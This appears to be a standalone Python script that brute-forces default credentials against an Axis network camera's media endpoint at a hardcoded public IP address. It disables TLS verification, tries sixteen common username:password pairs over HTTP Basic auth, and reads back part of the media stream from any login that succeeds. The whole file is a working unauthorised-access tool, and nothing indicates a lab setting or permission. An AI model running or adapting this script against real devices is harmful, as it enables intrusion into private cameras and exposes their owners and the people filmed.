#!/usr/bin/env python3
import urllib.request
import ssl
import sys
sys.stdout.reconfigure(encoding='utf-8')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

creds = [
    'root:root', 'root:pass', 'admin:admin', 'admin:axis',
    'admin:password', 'root:admin', 'root:1234', 'Axis:Axis',
    'axis:axis', 'admin:12345', 'admin:', 'root:',
    'admin:Admin', 'admin:AXIS', 'root:PASS', 'admin:admin123'
]

url = 'https://195.196.36.242/axis-cgi/media.cgi'
print(f'Testing credentials against {url}:')
print()
for c in creds:
    user, pwd = c.split(':', 1) if ':' in c else (c, '')
    try:
        # Create auth handler
        pwmgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
        pwmgr.add_password(None, url, user, pwd)
        auth = urllib.request.HTTPBasicAuthHandler(pwmgr)
        opener = urllib.request.build_opener(auth, urllib.request.HTTPSHandler(context=ctx))
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            with opener.open(req, timeout=5) as r:
                ct = r.headers.get('Content-Type', '?')
                cl = r.headers.get('Content-Length', '?')
                print(f'  ✓ HTTP {r.status} CT={ct[:50]} CL={cl} creds={c}')
                # if it works, capture some data
                data = r.read(1024)
                print(f'    data: {data[:100]}')
        except urllib.error.HTTPError as e:
            print(f'  ✗ HTTP {e.code} creds={c}')
    except Exception as e:
        print(f'  ERR {str(e)[:60]} creds={c}')